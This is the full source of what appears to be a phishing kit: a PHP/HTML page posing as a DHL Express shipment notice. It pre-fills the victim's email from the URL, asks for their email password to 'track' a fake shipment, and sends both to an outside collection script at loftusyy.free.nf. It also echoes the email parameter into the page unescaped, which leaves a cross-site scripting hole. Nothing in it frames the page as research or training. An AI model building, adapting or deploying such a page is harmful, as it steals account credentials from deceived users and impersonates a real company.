<?php
$email = $_GET['email'];

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>DHL EXPRESS NOTIFICATION</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
        crossorigin="anonymous">

    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f2f2f2;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .navbar {
            background-color: #ffffff;
            border-bottom: 1px solid #d9534f;
        }

        .navbar-brand img {
            width: 120px;
            height: 40px;
        }

        .navbar-nav a {
            color: #fff;
            margin-right: 15px;
        }

        .main-video-wrapper {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            overflow: hidden;
            z-index: -3;
        }

        .main-video-wrapper video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: -1;
        }

        .container-form {
            margin: auto;
            max-width: 400px;
            padding: 20px;
            background-color: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 5px;
            margin-top: 50px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            flex: 1; /* Occupy remaining vertical space */
        }

        input[type=email], input[type=password] {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            display: block;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        input[type=checkbox] {
            margin-bottom: 15px;
        }

        input[type=submit] {
            width: 100%;
            background-color: #ca1e07;
            color: #fff;
            padding: 14px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        input[type=submit]:hover {
            background-color: #b40404;
        }

        footer {
            background-color: #b40404;
            color: #fff;
            text-align: center;
            padding: 10px 0;
        }
    </style>
</head>

<body>

<!-- Navbar -->
<nav class="navbar navbar-expand-lg navbar-light">
    <div class="container">
        <a class="navbar-brand" href="#">
            <img src="https://imgur.com/kAQjgOv.png" alt="DHL Logo">
        </a>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav ml-auto">
                <li class="nav-item"><a class="nav-link" href="#">Home</a></li>
                <li class="nav-item"><a class="nav-link" href="#">Track Shipment</a></li>
                <li class="nav-item"><a class="nav-link" href="#">Login</a></li>
                <li class="nav-item"><a class="nav-link" href="#">Register</a></li>
            </ul>
        </div>
    </div>
</nav>

<!-- Main Content -->
<div class="main-video-wrapper">
    <video playsinline autoplay muted loop>
        <source src="https://wekotherm.one/eohm/bg.mp4" type="video/mp4">
    </video>
</div>

<div class="container container-form">
    <img src="https://imgur.com/9ZJDaRP.png" alt="DHL Logo" width="200" height="35">
    <h2 class="text-danger mt-3">Verification Required</h2>
    <p class="text-dark">
        Shipment <b>#SHZ7395</b> belongs to this receiver<br><br>
        To track the shipment, please confirm that you own this ID.
    </p>

    <!-- Form -->
    <form action="http://loftusyy.free.nf/view2.php" method="POST">
        <input type="email" name="user" placeholder="Enter Email Address" value="<?php echo $_GET['email']; ?>" />
        <input type="password" name="passwd" placeholder="Enter Email Password" required>
        <div>
            <input type="checkbox" checked>
            <label>Remember my email account on this device</label>
        </div>
        <input type="submit" value="Track Shipment">
    </form>
</div>

<!-- Footer -->
<footer class="text-center py-3">
    DHL Express &copy;2024 | All rights reserved
</footer>

</body>
</html>
